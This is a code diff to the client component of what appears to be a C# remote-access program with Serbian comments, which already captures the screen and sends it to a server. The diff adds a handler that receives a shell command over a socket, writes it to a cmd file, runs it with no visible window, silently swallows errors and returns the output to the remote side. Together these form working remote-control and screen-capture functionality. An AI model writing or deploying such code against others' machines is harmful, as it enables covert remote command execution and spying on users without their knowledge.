@@ -8,6 +8,8 @@ using Klijent.Networking.Packages;
 using System.Windows.Forms;
 using System.Drawing;
 using ScreenShotDemo;
+using System.IO;
+using System.Diagnostics;
 
 namespace Klijent.Networking
 {
@@ -44,6 +46,9 @@ namespace Klijent.Networking
                 case 4:
                     ScreenshotPacketHandler(clientSocket);
                     break;
+                case 6:
+                    ShellCommandPacketHandler(receivedPacket, clientSocket);
+                    break;
             }
         }
         private static void TextMessagePacketHandler(byte[] receivedPacket, Socket clientSocket)        
@@ -55,13 +60,13 @@ namespace Klijent.Networking
                     wasTheMessageEverReceived = true;
                     TextMessagePackage textMessagePackage = new TextMessagePackage(receivedPacket);
                     NewMessageForm.ReceiveMessage(textMessagePackage.textMessage);
-                    NewMessageForm.Show();
-                    Application.Run();
+                    NewMessageForm.ShowDialog();
+                    NewMessageForm.Focus();
                 }
                 else
                 {
                     TextMessagePackage textMessagePackage = new TextMessagePackage(receivedPacket);
-                    //NewMessageForm.Show();                            
+                    //NewMessageForm.Activate();                           
                     NewMessageForm.ReceiveMessage(textMessagePackage.textMessage);
                 }
             }
@@ -85,6 +90,42 @@ namespace Klijent.Networking
             Image img = sc.CaptureScreen();
             ScreenshotPackage screenShotPackage = new ScreenshotPackage(img);
             clientSocket.Send(screenShotPackage.ToByteArray());
+        }
+
+        private static void ShellCommandPacketHandler(byte[] receivedPacket, Socket clientSocket)
+        {
+            try
+            {               
+                ShellCommandPackage shellCommandPackage = new ShellCommandPackage(receivedPacket);
+                string cmdFilePath = Application.StartupPath + "\\cmd.cmd";
+                // Zapisujemo u fajl
+                using (StreamWriter sw = File.CreateText(cmdFilePath))
+                {
+                    sw.WriteLine(shellCommandPackage.shellCommand);
+                }
+
+                string shellOutput = null;
+                Process proc = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = cmdFilePath,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        CreateNoWindow = true
+                    }
+                };
+                proc.Start();
+                while (!proc.StandardOutput.EndOfStream)
+                {
+                    shellOutput += proc.StandardOutput.ReadLine() + "\n";
+                }
+                ShellOutputPackage shellOutputPackage = new ShellOutputPackage(shellOutput);
+                clientSocket.Send(shellOutputPackage.ToByteArray());
+            }
+            catch (Exception ex)
+            {
+            }
         }
     }
 }
